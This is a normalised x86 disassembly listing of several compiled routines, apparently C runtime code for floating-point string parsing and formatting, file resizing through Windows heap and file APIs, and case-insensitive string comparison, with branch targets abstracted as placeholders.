mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edi 0x1
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea eax [ esi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ esi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x30 ] eax
jns r-xdata
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
xor eax eax
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
mov ebx [ rw-data ]
add ebx [ rw-data ]
xor eax eax
inc eax
jmp r-xdata
sub ecx 0x4
dec edx
jns r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x10 ]
mov [ ebp - 0x2c ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x2c ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0x30 ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
mov ecx [ rw-data ]
lea eax [ ecx + 0x1 ]
cdq
and edx 0x1f
add eax edx
lea edx [ ecx + 0x1 ]
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x28 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x28 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
sub ecx 0x4
dec edx
jns r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp - 0x28 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_44f549
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
xor ecx ecx
push esi
xor esi esi
mov [ ebp - 0x78 ] eax
mov eax [ ebp + 0xc ]
inc esi
push edi
mov [ ebp - 0x70 ] eax
lea edi [ ebp - 0x20 ]
mov [ ebp - 0x74 ] ecx
mov [ ebp - 0x68 ] esi
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x58 ] ecx
mov [ ebp - 0x5c ] ecx
mov [ ebp - 0x60 ] ecx
mov [ ebp - 0x64 ] ecx
mov [ ebp - 0x50 ] ecx
mov [ ebp - 0x6c ] ecx
cmp [ ebp + 0x24 ] ecx
jne r-xdata
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x54 ] edx
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
xor eax eax
jmp r-xdata
inc edx
jmp r-xdata
cmp al 0x9
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_437c1c
leave
retn
mov al [ edx ]
cmp al 0x20
je r-xdata
cmp al 0xa
je r-xdata
cmp al 0xd
jne r-xdata
push ebx
mov bl 0x30
cmp ecx 0xa
jne r-xdata
jmp [ ecx * 4 + jump_table_44fbf5 ]
mov al [ edx ]
inc edx
cmp ecx 0xb
ja r-xdata
jmp r-xdata
lea ecx [ eax - 0x31 ]
cmp cl 0x8
ja r-xdata
lea ecx [ eax - 0x31 ]
mov [ ebp - 0x58 ] esi
cmp cl 0x8
jbe r-xdata
lea ecx [ eax - 0x31 ]
cmp cl 0x8
jbe r-xdata
mov [ ebp - 0x58 ] esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x5c ] esi
jne r-xdata
sub al bl
mov [ ebp - 0x5c ] esi
cmp al 0x9
ja r-xdata
lea ecx [ edx - 0x2 ]
mov [ ebp - 0x54 ] ecx
lea ecx [ eax - 0x31 ]
cmp cl 0x8
ja r-xdata
mov [ ebp - 0x60 ] esi
jmp r-xdata
lea ecx [ eax - 0x31 ]
cmp cl 0x8
jbe r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x60 ] esi
xor ecx ecx
jmp r-xdata
cmp [ ebp - 0x58 ] 0x0
mov eax [ ebp - 0x70 ]
mov [ eax ] edx
je r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
push 0x3
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al bl
jge r-xdata
cmp al bl
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x54 ]
jmp r-xdata
push 0x4
jmp r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x9
jmp r-xdata
cmp al bl
je r-xdata
cmp al bl
jmp r-xdata
push 0xa
pop ecx
dec edx
movsx eax al
sub eax 0x2b
lea ecx [ edx - 0x1 ]
mov [ ebp - 0x54 ] ecx
je r-xdata
cmp al bl
jge r-xdata
mov [ ebp - 0x6c ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0x4c ] eax
jbe r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x5
cmp al 0x2b
je r-xdata
push 0x4
jmp r-xdata
cmp al bl
je r-xdata
cmp al 0x39
jg r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
cmp al bl
je r-xdata
pop ecx
dec edx
jmp r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
mov al [ edx ]
inc edx
sub al 0x31
cmp al 0x8
jbe r-xdata
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
xor ecx ecx
xor eax eax
xor edx edx
xor esi esi
cmp [ ebp - 0x4c ] 0x0
jbe r-xdata
cmp [ ebp - 0x9 ] 0x5
jl r-xdata
and [ ebp - 0x74 ] 0x0
push 0x2
pop ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
dec edx
push 0xb
jmp r-xdata
cmp al 0x2d
je r-xdata
pop ecx
jmp r-xdata
mov ecx esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
cmp al 0x2b
je r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
dec [ ebp - 0x50 ]
mov al [ edx ]
inc edx
jmp r-xdata
or [ ebp - 0x68 ] 0xffffffff
push 0x7
pop ecx
jmp r-xdata
sub eax 0x3
dec edx
jmp r-xdata
push 0x8
jmp r-xdata
mov edx ecx
mov [ ebp - 0x64 ] ecx
jmp r-xdata
imul ecx ecx 0xa
movsx esi al
lea ecx [ ecx + esi - 0x30 ]
cmp ecx 0x1450
jg r-xdata
jmp r-xdata
dec edi
inc [ ebp - 0x50 ]
mov [ ebp - 0x4c ] eax
inc [ ebp - 0x9 ]
push 0x2
pop ecx
mov [ ebp - 0x74 ] 0x8000
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al bl
je r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
jmp r-xdata
cmp al 0x2d
je r-xdata
mov al [ edx ]
inc edx
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
dec [ ebp - 0x50 ]
cmp al bl
jge r-xdata
mov ecx 0x1451
mov al [ edx ]
inc edx
dec edi
cmp [ edi ] 0x0
je r-xdata
cmp al 0x43
jle r-xdata
mov al [ edx ]
inc edx
jmp r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
dec [ ebp - 0x4c ]
inc [ ebp - 0x50 ]
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x4c ]
lea eax [ ebp - 0x20 ]
push eax
call sub_450cc8
mov eax [ ebp - 0x64 ]
xor edx edx
add esp 0xc
cmp [ ebp - 0x68 ] edx
jge r-xdata
cmp al 0x45
jle r-xdata
mov al [ edx ]
inc edx
add eax [ ebp - 0x50 ]
cmp [ ebp - 0x60 ] edx
jne r-xdata
neg eax
push 0x6
jmp r-xdata
sub al 0x64
cmp al 0x1
ja r-xdata
cmp [ ebp - 0x5c ] edx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp eax 0x1450
jg r-xdata
sub eax [ ebp + 0x1c ]
xor esi esi
mov eax 0x7fff
mov edx 0x80000000
xor ecx ecx
mov [ ebp - 0x6c ] 0x2
jmp r-xdata
cmp eax 0xffffebb0
jl r-xdata
mov edi [ ebp - 0x78 ]
or eax [ ebp - 0x74 ]
mov [ edi ] cx
mov [ edi + 0xa ] ax
mov eax [ ebp - 0x6c ]
mov [ edi + 0x2 ] esi
mov [ edi + 0x6 ] edx
pop ebx
mov [ ebp - 0x6c ] 0x1
mov ecx rw-data
sub ecx 0x60
mov [ ebp - 0x54 ] eax
cmp eax edx
je r-xdata
mov eax [ ebp - 0x34 ]
movzx ecx [ ebp - 0x3c ]
mov esi [ ebp - 0x3a ]
mov edx [ ebp - 0x36 ]
shr eax 0x10
jmp r-xdata
jge r-xdata
cmp [ ebp + 0x14 ] edx
jne r-xdata
neg eax
mov ecx rw-data
mov [ ebp - 0x54 ] eax
sub ecx 0x60
cmp [ ebp - 0x54 ] edx
je r-xdata
xor eax eax
mov [ ebp - 0x3c ] ax
jmp r-xdata
mov eax [ ebp - 0x54 ]
sar [ ebp - 0x54 ] 0x3
add ecx 0x54
and eax 0x7
mov [ ebp - 0x7c ] ecx
cmp eax edx
je r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
imul eax eax 0xc
lea ebx [ ecx + eax ]
mov eax 0x8000
cmp [ ebx ] ax
jb r-xdata
mov ecx [ ebp - 0x7c ]
xor edx edx
mov edx [ ebp - 0x32 ]
xor eax eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
movzx eax [ ebx + 0xa ]
mov esi eax
xor esi [ ebp - 0x32 ]
mov ecx 0x7fff
and edx ecx
and eax ecx
and esi 0x8000
mov edi 0x7fff
lea ecx [ eax + edx ]
mov [ ebp - 0x70 ] esi
movzx ecx cx
cmp dx di
jae r-xdata
mov esi ebx
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x46 ]
lea ebx [ ebp - 0x48 ]
xor eax eax
test si si
sete al
and [ ebp - 0x38 ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x3c ] 0x0
cmp ax di
jae r-xdata
mov edi 0xbffd
cmp cx di
ja r-xdata
mov esi 0x3fbf
cmp cx si
ja r-xdata
xor esi esi
cmp dx si
jne r-xdata
xor eax eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x3c ] eax
jmp r-xdata
cmp ax si
jne r-xdata
inc ecx
test [ ebp - 0x34 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x68 ] esi
lea edi [ ebp - 0x28 ]
mov [ ebp - 0x58 ] 0x5
inc ecx
test [ ebx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x38 ] esi
jne r-xdata
add edi 0x2
inc [ ebp - 0x68 ]
dec [ ebp - 0x58 ]
cmp [ ebp - 0x58 ] 0x0
jg r-xdata
lea eax [ ebp + eax - 0x3c ]
mov [ ebp - 0x5c ] eax
lea eax [ ebx + 0x8 ]
mov [ ebp - 0x60 ] eax
cmp [ ebx + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x3c ] esi
jne r-xdata
mov eax [ ebp - 0x68 ]
mov edx [ ebp - 0x58 ]
add eax eax
mov [ ebp - 0x64 ] edx
test edx edx
jle r-xdata
add ecx 0xc002
test cx cx
jle r-xdata
mov [ ebp - 0x4c ] 0x1
cmp esi eax
jae r-xdata
cmp [ ebx ] esi
jne r-xdata
xor eax eax
mov [ ebp - 0x32 ] ax
jmp r-xdata
add ecx 0xffff
test cx cx
jns r-xdata
mov edi [ ebp - 0x24 ]
test edi edi
js r-xdata
add [ ebp - 0x5c ] 0x2
sub [ ebp - 0x60 ] 0x2
dec [ ebp - 0x64 ]
cmp [ ebp - 0x64 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x4c ] 0x0
mov [ edi - 0x4 ] esi
je r-xdata
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] esi
jmp r-xdata
mov eax 0x8000
cmp [ ebp - 0x2c ] ax
ja r-xdata
mov eax ecx
neg eax
movzx esi ax
add ecx esi
test cx cx
jg r-xdata
mov esi [ ebp - 0x28 ]
mov eax [ ebp - 0x2c ]
shl [ ebp - 0x2c ] 0x1
shr eax 0x1f
mov edx esi
add esi esi
or esi eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add ecx 0xffff
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] eax
test cx cx
jg r-xdata
mov eax [ ebp - 0x60 ]
mov edx [ ebp - 0x5c ]
movzx edx [ edx ]
movzx eax [ eax ]
and [ ebp - 0x4c ] 0x0
imul eax edx
mov edx [ edi - 0x4 ]
lea esi [ edx + eax ]
cmp esi edx
jb r-xdata
cmp [ ebp - 0x2a ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x2c ]
and edx 0x1ffff
cmp edx 0x18000
jne r-xdata
mov eax [ ebp - 0x24 ]
mov edi [ ebp - 0x28 ]
mov edx [ ebp - 0x28 ]
shr [ ebp - 0x24 ] 0x1
shl eax 0x1f
shr edi 0x1
or edi eax
mov eax [ ebp - 0x2c ]
shl edx 0x1f
shr eax 0x1
or eax edx
dec esi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x2c ] eax
jne r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x2a ]
and [ ebp - 0x2a ] 0x0
cmp [ ebp - 0x26 ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp cx ax
jb r-xdata
test [ ebp - 0x2c ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] esi
je r-xdata
mov ax [ ebp - 0x2a ]
or ecx [ ebp - 0x70 ]
mov [ ebp - 0x3c ] ax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x3a ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x36 ] eax
mov [ ebp - 0x32 ] cx
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x70 ] ax
mov [ ebp - 0x38 ] eax
sete cl
mov [ ebp - 0x3c ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x34 ] ecx
jmp r-xdata
inc [ ebp - 0x26 ]
jmp r-xdata
and [ ebp - 0x26 ] 0x0
mov edx 0xffff
cmp [ ebp - 0x22 ] dx
jne r-xdata
or [ ebp - 0x2c ] 0x1
inc [ ebp - 0x22 ]
jmp r-xdata
mov [ ebp - 0x22 ] ax
inc ecx
jmp r-xdata
sub_44fc25
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
xor ebx ebx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
call sub_44bd22
mov [ ebp - 0x18 ] eax
and eax edx
add esp 0x10
mov [ ebp - 0x14 ] edx
cmp eax 0xffffffff
je r-xdata
call sub_43c04c
mov eax [ eax ]
push 0x2
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_44bd22
mov ecx eax
and ecx edx
add esp 0x10
cmp ecx 0xffffffff
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
sub esi eax
sbb edi edx
js r-xdata
cmp edi ebx
jg r-xdata
jg r-xdata
push ebx
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ ebp + 0x8 ]
call sub_44bd22
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
jl r-xdata
mov ebx 0x1000
push ebx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
cmp esi ebx
jbe r-xdata
xor eax eax
jmp r-xdata
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_44bd22
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
cmp esi ebx
jae r-xdata
push 0x8000
push [ ebp + 0x8 ]
call sub_4391a3
pop ecx
pop ecx
mov [ ebp - 0x8 ] eax
call sub_43c04c
mov [ eax ] 0xc
pop edi
pop esi
pop ebx
leave
retn
push [ ebp + 0x8 ]
call sub_442da2
pop ecx
push eax
call [ SetEndOfFile@IAT ]
neg eax
sbb eax eax
neg eax
dec eax
cdq
mov [ ebp - 0x10 ] eax
and eax edx
mov [ ebp - 0xc ] edx
cmp eax 0xffffffff
jne r-xdata
mov eax esi
jg r-xdata
call sub_43c04c
mov [ eax ] 0xd
call sub_43c05f
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
mov esi [ ebp - 0x10 ]
call sub_43c05f
cmp [ eax ] 0x5
jne r-xdata
cdq
sub esi eax
sbb edi edx
js r-xdata
mov eax ebx
jmp r-xdata
cmp esi ebx
jb r-xdata
or esi 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
call sub_43c04c
mov [ eax ] 0xd
mov esi [ ebp - 0x10 ]
jg r-xdata
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_44a69c
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_4391a3
pop ecx
pop ecx
push [ ebp - 0x4 ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor ebx ebx
jmp r-xdata
and esi [ ebp - 0xc ]
cmp esi 0xffffffff
je r-xdata
test edi edi
jl r-xdata
test esi esi
jne r-xdata
sub_44fde0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_44fe41
mov edi edi
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
movzx eax [ ebp + 0x10 ]
movzx edx [ ebp + 0x10 ]
mov ecx 0x8000
and eax ecx
push ebx
mov ebx [ ebp + 0x1c ]
mov [ ebp - 0x60 ] eax
lea eax [ ecx - 0x1 ]
push esi
and edx eax
cmp [ ebp - 0x60 ] 0x0
push edi
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x30 ] 0xcccccccc
mov [ ebp - 0x2c ] 0xcccccccc
mov [ ebp - 0x28 ] 0x3ffbcccc
mov [ ebp - 0x74 ] 0x1
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp r-xdata
cmp dx ax
jne r-xdata
test esi esi
jne r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
test dx dx
jne r-xdata
movzx ecx dx
mov ebx ecx
imul ecx ecx 0x4d10
mov eax esi
shr eax 0x18
shr ebx 0x8
lea eax [ ebx + eax * 2 ]
imul eax eax 0x4d
lea eax [ eax + ecx - 0x134312f4 ]
sar eax 0x10
movzx eax ax
xor ecx ecx
mov [ ebp - 0x20 ] cx
movsx ebx ax
mov ecx rw-data
sub ecx 0x60
neg ebx
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x16 ] dx
mov [ ebp - 0x1a ] esi
mov [ ebp - 0x1e ] edi
mov [ ebp - 0x68 ] ecx
je r-xdata
mov ecx [ ebp + 0xc ]
xor eax eax
inc eax
mov [ ebx ] ax
mov eax 0x80000000
cmp ecx eax
jne r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x18 ]
shr ecx 0x10
mov edx 0x3fff
mov eax 0x7fff
cmp cx dx
jb r-xdata
test ebx ebx
jns r-xdata
test ecx 0x40000000
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
cmp [ ebp - 0x60 ] cx
mov [ ebx ] ax
setne al
dec al
and al 0xd
add al 0x20
mov [ ebx + 0x2 ] al
mov [ ebx + 0x3 ] 0x3001
mov [ ebx + 0x5 ] 0x0
test [ ebp + 0x18 ] 0x1
mov edx [ ebp - 0x64 ]
mov eax [ ebp - 0x4c ]
mov edi [ ebp + 0x14 ]
mov [ edx ] ax
je r-xdata
mov ebx [ ebp - 0x26 ]
inc [ ebp - 0x4c ]
xor edx edx
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0x26 ]
xor ebx ecx
and ecx eax
and edx eax
and ebx 0x8000
lea esi [ edx + ecx ]
mov [ ebp - 0x5c ] ebx
movzx esi si
cmp cx ax
jae r-xdata
je r-xdata
mov eax rw-data
sub eax 0x60
neg ebx
mov [ ebp - 0x68 ] eax
test ebx ebx
xor edx edx
cmp [ ebp - 0x60 ] dx
je r-xdata
push r--data
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_437c1c
leave
retn
cmp edi 0x15
jle r-xdata
cwde
add edi eax
test edi edi
jg r-xdata
xor eax eax
test bx bx
sete al
and [ ebp - 0x1c ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x20 ] 0x0
cmp dx ax
jae r-xdata
add [ ebp - 0x68 ] 0x54
mov ecx ebx
sar ebx 0x3
and ecx 0x7
je r-xdata
cmp ecx eax
jne r-xdata
cmp ecx 0xc0000000
jne r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_43f118
add esp 0xc
test eax eax
jne r-xdata
mov esi [ ebp - 0x18 ]
shr esi 0x10
sub esi 0x3ffe
xor eax eax
mov [ ebp - 0x16 ] ax
mov [ ebp - 0x44 ] 0x8
push 0x15
pop edi
xor eax eax
mov [ edx ] ax
mov eax 0x8000
cmp [ ebp - 0x60 ] ax
mov [ edx + 0x3 ] 0x3001
setne al
dec al
and al 0xd
add al 0x20
mov [ edx + 0x2 ] al
mov [ edx + 0x5 ] 0x0
jmp r-xdata
mov eax 0xbffd
cmp si ax
ja r-xdata
xor esi esi
imul ecx ecx 0xc
add ecx [ ebp - 0x68 ]
mov eax ecx
mov [ ebp - 0x44 ] ecx
mov ecx 0x8000
cmp [ eax ] cx
jb r-xdata
push r--data
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edx
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_43f873
mov [ ebx + 0x3 ] 0x6
mov eax [ ebp - 0x20 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shl [ ebp - 0x20 ] 0x1
shr eax 0x1f
add ebx ebx
or ebx eax
mov eax [ ebp - 0x18 ]
shr ecx 0x1f
add eax eax
or eax ecx
dec [ ebp - 0x44 ]
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] eax
jne r-xdata
test esi esi
jns r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax 0x3fbf
cmp si ax
ja r-xdata
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] ecx
movzx ecx [ eax + 0xa ]
mov edx ecx
xor edx [ ebp - 0x16 ]
mov esi 0x7fff
and edx 0x8000
mov [ ebp - 0x58 ] edx
mov edx [ ebp - 0x16 ]
and edx esi
and ecx esi
lea esi [ ecx + edx ]
movzx edi si
mov esi 0x7fff
cmp dx si
jae r-xdata
mov esi eax
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x3a ]
mov [ ebp - 0x44 ] eax
push r--data
push r--data
jmp r-xdata
lea eax [ edi + 0x1 ]
lea ebx [ edx + 0x4 ]
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x4c ] eax
test eax eax
jle r-xdata
neg esi
and esi 0xff
jle r-xdata
xor eax eax
cmp cx ax
jne r-xdata
xor eax eax
xor eax eax
xor esi esi
cmp [ ebp - 0x58 ] si
sete al
dec eax
and eax 0x80000000
add eax 0x7fff8000
mov [ ebp - 0x18 ] eax
jmp r-xdata
cmp cx si
jae r-xdata
mov [ ebx + 0x3 ] 0x5
jmp r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_43f118
add esp 0xc
test eax eax
jne r-xdata
mov al [ ebx - 0x1 ]
sub ebx 0x2
cmp al 0x35
jge r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
shl [ ebp - 0x20 ] 0x1
mov edi [ ebp - 0x20 ]
shl [ ebp - 0x20 ] 0x1
shr edx 0x1f
lea ecx [ eax + eax ]
or ecx edx
mov edx [ ebp - 0x18 ]
mov esi eax
shr esi 0x1f
add edx edx
or edx esi
mov eax ecx
lea esi [ ecx + ecx ]
shr eax 0x1f
lea ecx [ edx + edx ]
mov edx [ ebp - 0x3c ]
shr edi 0x1f
or ecx eax
mov eax [ ebp - 0x20 ]
or esi edi
lea edi [ edx + eax ]
cmp edi eax
jb r-xdata
mov eax [ ebp - 0x18 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shr [ ebp - 0x18 ] 0x1
shl eax 0x1f
shr ebx 0x1
or ebx eax
mov eax [ ebp - 0x20 ]
shl ecx 0x1f
shr eax 0x1
or eax ecx
dec esi
mov [ ebp - 0x1c ] ebx
